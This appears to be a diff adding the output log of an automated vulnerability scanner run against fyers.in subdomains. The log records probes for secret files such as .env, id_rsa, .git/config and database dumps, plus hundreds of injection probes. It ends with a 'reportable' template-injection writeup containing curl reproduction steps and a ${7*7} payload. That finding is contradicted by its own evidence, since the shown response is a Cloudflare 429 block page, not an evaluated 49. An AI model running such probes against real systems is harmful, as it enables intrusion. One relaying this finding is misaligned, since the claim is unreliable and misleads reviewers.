@@ -1,0 +1,400 @@
+path: https://recruit.fyers.in/jobs/Careers/README.md [302] (0b)
+path: https://recruit.fyers.in/jobs/Careers/CHANGELOG.md [302] (0b)
+path: https://recruit.fyers.in/jobs/Careers/LICENSE [302] (0b)
+path: https://recruit.fyers.in/jobs/Careers/package.json [302] (0b)
+path: https://recruit.fyers.in/jobs/Careers/composer.json [302] (0b)
+path: https://recruit.fyers.in/jobs/Careers/yarn.lock [302] (0b)
+path: https://recruit.fyers.in/jobs/Careers/Dockerfile [302] (0b)
+path: https://recruit.fyers.in/jobs/Careers/.htpasswd [302] (0b)
+path: https://recruit.fyers.in/jobs/Careers/id_rsa [302] (0b)
+path: https://recruit.fyers.in/jobs/Careers/config.yml [302] (0b)
+path: https://recruit.fyers.in/jobs/Careers/config.yaml [302] (0b)
+path: https://recruit.fyers.in/jobs/Careers/docker-compose.yml [302] (0b)
+path: https://recruit.fyers.in/jobs/Careers/.htaccess [302] (0b)
+path: https://recruit.fyers.in/jobs/Careers/settings.py [302] (0b)
+path: https://recruit.fyers.in/jobs/Careers/application.properties [302] (0b)
+path: https://recruit.fyers.in/jobs/Careers/credentials [302] (0b)
+path: https://status.fyers.in/.git/HEAD [403] (919b)
+path: https://status.fyers.in/.git/config [403] (919b)
+path: https://status.fyers.in/.env [403] (919b)
+path: https://status.fyers.in/.env.local [403] (919b)
+path: https://status.fyers.in/.env.production [403] (919b)
+path: https://status.fyers.in/config.php [403] (919b)
+path: https://status.fyers.in/robots.txt [200] (48b)
+path: https://status.fyers.in/wp-config.php [403] (919b)
+path: https://status.fyers.in/wp-config.php.bak [403] (919b)
+path: https://status.fyers.in/admin [302] (113b)
+path: https://status.fyers.in/admin/login [302] (89b)
+path: https://status.fyers.in/login [302] (89b)
+path: https://status.fyers.in/adminer.php [403] (919b)
+path: https://status.fyers.in/graphql [302] (89b)
+path: https://status.fyers.in/api/v1 [302] (89b)
+path: https://status.fyers.in/api [200] (55765b)
+path: https://status.fyers.in/api/v2 [200] (55768b)
+path: https://status.fyers.in/actuator [403] (919b)
+path: https://status.fyers.in/actuator/health [403] (919b)
+path: https://status.fyers.in/actuator/env [403] (919b)
+path: https://status.fyers.in/crossdomain.xml [403] (919b)
+path: https://status.fyers.in/web.config [403] (919b)
+path: https://status.fyers.in/phpinfo.php [403] (919b)
+path: https://status.fyers.in/info.php [403] (919b)
+path: https://status.fyers.in/README.md [403] (919b)
+path: https://status.fyers.in/.well-known/security.txt [200] (1448b)
+path: https://status.fyers.in/package.json [403] (919b)
+path: https://status.fyers.in/composer.json [403] (919b)
+path: https://status.fyers.in/yarn.lock [403] (919b)
+path: https://status.fyers.in/.htaccess [403] (919b)
+path: https://status.fyers.in/.htpasswd [403] (919b)
+path: https://status.fyers.in/config.yml [403] (919b)
+path: https://support.fyers.in/portal/en/home/.git/config [403] (5482b)
+path: https://support.fyers.in/portal/en/home/.htaccess [403] (5482b)
+path: https://support.fyers.in/portal/en/home/.htpasswd [403] (5482b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/robots.txt [200] (131370b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/.git/HEAD [200] (131370b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/sitemap.xml [200] (131371b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/.git/config [200] (131372b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/.env [200] (131364b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/.env.local [200] (131370b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/config.php [200] (131370b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/.env.production [200] (131375b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/.DS_Store [200] (131369b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/config.json [200] (131371b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/wp-config.php [200] (131374b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/backup.zip [200] (131370b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/wp-config.php.bak [200] (131378b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/backup.tar.gz [200] (131373b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/backup.sql [200] (131370b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/db.sql [200] (131366b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/dump.sql [200] (131368b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/database.sql [200] (131372b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/admin [200] (131365b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/administrator [200] (131373b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/admin/login [200] (131372b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/login [200] (131365b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/signin [200] (131366b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/user [200] (131364b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/users [200] (131365b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/account [200] (131367b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/dashboard [200] (131369b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/panel [200] (131365b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/phpmyadmin [200] (131370b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/adminer.php [200] (131371b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/pma [200] (131363b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/server-status [200] (131374b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/server-info [200] (131372b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/api [200] (131363b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/api/v1 [200] (131367b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/api/v2 [200] (131367b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/graphql [200] (131367b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/swagger [200] (131367b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/swagger.json [200] (131372b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/openapi.json [200] (131372b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/api-docs [200] (131369b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/docs [200] (131364b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/actuator [200] (131368b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/actuator/health [200] (131376b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/actuator/env [200] (131373b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/metrics [200] (131367b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/debug [200] (131365b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/test [200] (131364b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/status [200] (131366b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/info [200] (131364b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/health [200] (131366b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/console [200] (131367b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/.well-known/security.txt [200] (131386b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/crossdomain.xml [200] (131375b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/web.config [200] (131370b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/phpinfo.php [200] (131371b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/info.php [200] (131368b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/readme.html [200] (131371b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/README.md [200] (131369b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/CHANGELOG.md [200] (131372b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/LICENSE [200] (131367b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/package.json [200] (131372b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/composer.json [200] (131373b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/yarn.lock [200] (131369b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/Dockerfile [200] (131370b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/docker-compose.yml [200] (131379b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/.htaccess [200] (131369b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/.htpasswd [200] (131369b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/id_rsa [200] (131366b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/config.yml [200] (131370b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/config.yaml [200] (131371b)
+path: https://fyers.in/robots.txt [200] (1184b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/settings.py [200] (131371b)
+path: https://fyers.in/.git/HEAD [403] (5482b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/application.properties [200] (131382b)
+path: https://fyers.in/.git/config [403] (5482b)
+path: https://fyers.in/.env [403] (5482b)
+path: https://fyers.in/sitemap.xml [200] (750b)
+path: https://fyers.in/.DS_Store [403] (5482b)
+path: https://accounts.zoho.in/signin?servicename=TeamDrive&hide_gsignup=true&hide_signup=true&serviceurl=https%3A%2F%2Fworkdrive.zoho.in%2F/credentials [200] (131371b)
+path: https://fyers.in/wp-config.php [403] (5482b)
+path: https://fyers.in/wp-config.php.bak [403] (5482b)
+▶ Vulnerability Checks
+Vulnerability checks complete: 189 findings
+▶ OWASP Top 10 Testing
+OWASP: 120 parameterised URLs, 59 hosts
+OWASP: 585 injection probes across 142 parameters
+  [info] SSRF candidate parameter 'source' — https://api-a1.fyers.in/marina/v1/kra/profile?source=1
+  [info] SSRF candidate parameter 'source' — https://api-i1.fyers.in/invest/admin/v1/sgb/issue-list?is_active=1&issue_id=1&source=1
+  [critical] Server-side template injection in 'issue_id' — https://api-i1.fyers.in/invest/admin/v1/sgb/issue-list?is_active=1&issue_id=1&source=1
+  [low] Open redirect via 'redirect' — https://community.fyers.in/?auto_login=1&redirect=1
+  [info] SSRF candidate parameter 'redirect' — https://community.fyers.in/?auto_login=1&redirect=1
+  [info] SSRF candidate parameter 'redirect' — https://community.fyers.in/auth/login?redirect=1
+  [low] Open redirect via 'redirect' — https://community.fyers.in/auth/login?redirect=1
+  [info] SSRF candidate parameter 'redirect' — https://community.fyers.in/auth/signup?redirect=1
+  [low] Open redirect via 'redirect' — https://community.fyers.in/auth/signup?redirect=1
+  [info] SSRF candidate parameter 'redirect' — https://community.fyers.in/forgot?redirect=1
+  [low] Open redirect via 'redirect' — https://community.fyers.in/forgot?redirect=1
+  [info] SSRF candidate parameter 'redirect' — https://community.fyers.in/login?redirect=1
+  [low] Open redirect via 'redirect' — https://community.fyers.in/login?redirect=1
+  [info] SSRF candidate parameter 'url' — https://fyers.in/_next/image?amp;q=1&amp;w=1&url=1
+  [info] SSRF candidate parameter 'url' — https://fyers.in/_next/image?q=1&url=1&w=1
+  [info] SSRF candidate parameter 'redirect' — https://fyers.in/community/auth/login?redirect=1
+  [info] SSRF candidate parameter 'redirect' — https://fyers.in/community/auth/signup?redirect=1
+  [info] SSRF candidate parameter 'redirect' — https://fyers.in/community/auth/verify?memberId=1&redirect=1
+  [low] Third-party script without Subresource Integrity — fyers.in
+  [low] Third-party script without Subresource Integrity — fyers.in
+  [low] Third-party script without Subresource Integrity — myapi.fyers.in
+  [low] Third-party script without Subresource Integrity — api-connect-docs.fyers.in
+  [low] Third-party script without Subresource Integrity — api-dashboard.fyers.in
+  [low] Third-party script without Subresource Integrity — fyers.in
+  [low] Third-party script without Subresource Integrity — assets.fyers.in
+  [low] Third-party script without Subresource Integrity — api-t1.fyers.in
+  [low] Third-party script without Subresource Integrity — bo-login.fyers.in
+  [low] Third-party script without Subresource Integrity — cdn.fyers.in
+  [low] Third-party script without Subresource Integrity — charts.fyers.in
+  [low] Third-party script without Subresource Integrity — clib.fyers.in
+  [low] Third-party script without Subresource Integrity — fyers.in
+  [low] Third-party script without Subresource Integrity — data.fyers.in
+  [low] Third-party script without Subresource Integrity — debt.fyers.in
+  [low] Third-party script without Subresource Integrity — fyers.in
+  [low] Third-party script without Subresource Integrity — dev.fyers.in
+  [low] Third-party script without Subresource Integrity — fundtransfer.fyers.in
+  [low] Third-party script without Subresource Integrity — fyers.in
+  [low] Third-party script without Subresource Integrity — insights.fyers.in
+  [low] Third-party script without Subresource Integrity — instaoptions.fyers.in
+  [low] Third-party script without Subresource Integrity — accounts.zoho.in
+  [low] Third-party script without Subresource Integrity — ipo.fyers.in
+  [low] Third-party script without Subresource Integrity — journal.fyers.in
+  [low] Third-party script without Subresource Integrity — learn.fyers.in
+  [low] Third-party script without Subresource Integrity — mail.fyers.in
+  [low] Third-party script without Subresource Integrity — login.fyers.in
+  [low] Third-party script without Subresource Integrity — accounts.zoho.in
+  [low] Third-party script without Subresource Integrity — marketsmith.fyers.in
+  [low] Third-party script without Subresource Integrity — fyers.in
+  [low] Third-party script without Subresource Integrity — myapi.fyers.in
+  [low] Third-party script without Subresource Integrity — ofs.fyers.in
+  [low] Third-party script without Subresource Integrity — open-account.fyers.in
+  [low] Third-party script without Subresource Integrity — partners.fyers.in
+  [low] Third-party script without Subresource Integrity — partners.fyers.in
+  [low] Third-party script without Subresource Integrity — people.fyers.in
+  [low] Risky HTTP methods enabled: TRACE — int-invest.fyers.in
+  [low] Third-party script without Subresource Integrity — fyers.in
+  [low] Third-party script without Subresource Integrity — public-docs.fyers.in
+  [low] Third-party script without Subresource Integrity — public.fyers.in
+  [low] Risky HTTP methods enabled: DELETE, PATCH, PUT — marketdata-api-instaoptions.fyers.in
+  [low] Third-party script without Subresource Integrity — accounts.zoho.in
+  [low] Third-party script without Subresource Integrity — savedcharts.fyers.in
+  [low] Third-party script without Subresource Integrity — accounts.zoho.in
+  [low] Third-party script without Subresource Integrity — signup.fyers.in
+  [low] Third-party script without Subresource Integrity — socket.fyers.in
+  [low] Third-party script without Subresource Integrity — support.fyers.in
+  [low] Third-party script without Subresource Integrity — supportdesk.fyers.in
+  [low] Third-party script without Subresource Integrity — trade.fyers.in
+  [low] Third-party script without Subresource Integrity — verifiedpnldocs.fyers.in
+  [low] Third-party script without Subresource Integrity — fyers.in
+  [low] Third-party script without Subresource Integrity — status.fyers.in
+  [low] Third-party script without Subresource Integrity — accounts.zoho.in
+  [low] Third-party script without Subresource Integrity — accounts.zoho.in
+OWASP coverage: A01×5, A03×1, A05×2, A08×52, A10×12
+▶ Known CVE Matching
+CVE check: matching 59 host banner(s) against 18 curated CVEs
+CVE check: no curated CVE matched the detected versions
+▶ Access Control / IDOR (needs 2 sessions)
+Access control: needs two sessions — skipped
+▶ Triage — selecting the single strongest finding
+  not standalone-reportable: Possible SSH private key exposed — speculative findings do not meet the evidence bar
+  not standalone-reportable: Possible SSH private key exposed — speculative findings do not meet the evidence bar
+  not standalone-reportable: Possible SSH private key exposed — speculative findings do not meet the evidence bar
+  not standalone-reportable: Possible SSH private key exposed — speculative findings do not meet the evidence bar
+  not standalone-reportable: Possible SSH private key exposed — speculative findings do not meet the evidence bar
+  not standalone-reportable: Possible backup file exposed — speculative findings do not meet the evidence bar
+  not standalone-reportable: Possible backup file exposed — speculative findings do not meet the evidence bar
+  not standalone-reportable: Possible backup file exposed — speculative findings do not meet the evidence bar
+  not standalone-reportable: Possible backup file exposed — speculative findings do not meet the evidence bar
+  not standalone-reportable: Possible backup file exposed — speculative findings do not meet the evidence bar
+  not standalone-reportable: Possible backup file exposed — speculative findings do not meet the evidence bar
+  not standalone-reportable: Possible backup file exposed — speculative findings do not meet the evidence bar
+  … and 165 more non-reportable findings
+  84 candidate(s) past the filter; verifying strongest first
+  ✓ reportable: Server-side template injection in 'issue_id' [high]
+====================================================================
+Scan complete in 424.0s — Subdomains: 71, Live hosts: 59, URLs: 32270, JS files: 800, Endpoints: 38, Live APIs: 12, Parameters: 112, Secrets: 0, Findings: 261, Critical/High: 51
+====================================================================
+
+Summary
+  Subdomains       71
+  Live hosts       59
+  URLs             32270
+  JS files         800
+  Endpoints        38
+  Live APIs        12
+  Parameters       112
+  Secrets          0
+  Findings         261
+  Critical/High    51
+
+Reportable finding  [high]
+────────────────────────────────────────────────────────────────────
+# Server-side template injection in 'issue_id'
+
+**Severity:** High — The server evaluated an injected expression; command execution was not attempted, so this is not graded Critical.
+
+**OWASP:** A03:2021 Injection
+
+## Summary
+
+Input to this parameter is executed as a template expression on the server.
+
+## Affected Component
+
+- **Endpoint:** `https://api-i1.fyers.in/invest/admin/v1/sgb/issue-list?is_active=1&issue_id=1&source=1`
+- **Method:** `GET`
+- **Parameter / field:** `issue_id`
+- **Host:** `api-i1.fyers.in`
+- **Authentication required:** No — reproduced unauthenticated
+
+## Steps to Reproduce
+
+1. baseline, unmodified request:
+   ```
+   curl -i -s -X GET 'https://api-i1.fyers.in/invest/admin/v1/sgb/issue-list?is_active=1&issue_id=1&source=1'
+   ```
+   Server returns `401` — baseline, unmodified request.
+2. template expression injected into 'issue_id':
+   ```
+   curl -i -s -X GET 'https://api-i1.fyers.in/invest/admin/v1/sgb/issue-list?is_active=1&issue_id=$%7B7%2A7%7D&source=1'
+   ```
+   Server returns `429` — template expression injected into 'issue_id'.
+
+## Proof of Concept
+
+**Request 1** — baseline, unmodified request
+
+```http
+GET /invest/admin/v1/sgb/issue-list?is_active=1&issue_id=1&source=1 HTTP/1.1
+Host: TARGET_HOST
+User-Agent: SmartHunt/1.0 (+recon)
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Cookie: ATTACKER_SESSION
+```
+
+**Response 1**
+
+```http
+HTTP/1.1 401
+Date: Thu, 06 Aug 2026 05:34:39 GMT
+Content-Type: application/json
+Content-Length: 92
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+server: cloudflare
+cf-cache-status: DYNAMIC
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+CF-RAY: a26bac751cc50995-SJC
+
+{"s":"error","error_code":-27,"status_code":401,"message":"Could not authenticate the user"}
+```
+
+**Request 2** — template expression injected into 'issue_id'
+
+```http
+GET /invest/admin/v1/sgb/issue-list?is_active=1&issue_id=$%7B7%2A7%7D&source=1 HTTP/1.1
+Host: TARGET_HOST
+User-Agent: SmartHunt/1.0 (+recon)
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Cookie: ATTACKER_SESSION
+```
+
+**Response 2**
+
+```http
+HTTP/1.1 429
+Date: Thu, 06 Aug 2026 05:34:39 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Retry-After: 0
+Cache-Control: private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Expires: Thu, 01 Jan 1970 00:00:01 GMT
+Referrer-Policy: same-origin
+X-Frame-Options: SAMEORIGIN
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+X-Content-Type-Options: nosniff
+Server: cloudflare
+CF-RAY: a26bac7b183d0995-SJC
+
+<!doctype html>
+<!--[if lt IE 7]> <html class="no-js ie6 oldie" lang="en-US"> <![endif]-->
+<!--[if IE 7]>    <html class="no-js ie7 oldie" lang="en-US"> <![endif]-->
+<!--[if IE 8]>    <html class="no-js ie8 oldie" lang="en-US"> <![endif]-->
+<!--[if gt IE 8]><!-->
+<html class="no-js" lang="en-US">
+    <!--<![endif]-->
+    <head>
+        <title>Access denied | TARGET_HOST used Cloudflare to restrict access | TARGET_HOST | Cloudflare</title>
+        <meta charset="UTF-8" />
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+<meta name="robots" content="noindex, nofollow" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<link rel="stylesheet" id="cf_styles-css" href="/cdn-cgi/styles/main.css" /> <script>
+  (function(){if(document.addEventListener&&window.XMLHttpRequest&&JSON&&JSON.stringify){var e=function(a){var c=document.getElementById("error-feedback-survey"),d=document.getElementById("error-feedback-success"),b=new XMLHttpRequest;a={event:"feedback clicked",properties:{errorCode: 1015 },helpful:a,version: 1 };b.open("POST","https://sparrow.cloudflare.com/api/v1/event");b.setRequestHeader("Content-Type","application/json");b.setRequestHeader("Sparrow-Source-Key","c771f0e4b54944bebf4261d44bd79a1e");
+b.send(JSON.stringify(a));c.classList.add("feedback-hidden");d.classList.re
+… [2800 more bytes]
+```
+
+## Impact
+
+- **Proven:** Input to this parameter is executed as a template expression on the server.
+- **Security boundary crossed:** Untrusted input is evaluated by the server-side template engine
+
+## Expected vs Actual
+
+- **Expected:** ${7*7} is rendered literally as text
+- **Actual:** The server evaluated the expression and returned 49
+
+## Reproduction Reliability
+
+Reproduced 3× total, unauthenticated.
+
+## Remediation
+
+- Never pass user input into template source; pass it as context data
+- Use a sandboxed/logic-less template engine where possible
+- Validate against an allow-list when a template must be selected by input
+
+---
+
+Selected from 261 scan finding(s); 177 were informational or hardening-only and are not reportable on their own. Credentials and personal data above are masked.
+
+(261 raw findings in total, 51 critical/high — full list in the exported JSON and CSV.)
+
+Wrote 11 files to /tmp/sh-out/fyers_in
+  /tmp/sh-out/fyers_in/fyers_in.json
+  /tmp/sh-out/fyers_in/fyers_in.html
+  /tmp/sh-out/fyers_in/fyers_in.md
+  /tmp/sh-out/fyers_in/fyers_in-findings.csv
+  /tmp/sh-out/fyers_in/fyers_in-REPORT.md
+  /tmp/sh-out/fyers_in/lists/subdomains.txt
+  /tmp/sh-out/fyers_in/lists/live-hosts.txt
+  /tmp/sh-out/fyers_in/lists/urls.txt
+  /tmp/sh-out/fyers_in/lists/js-files.txt
+  /tmp/sh-out/fyers_in/lists/endpoints.txt
+  /tmp/sh-out/fyers_in/lists/parameters.txt
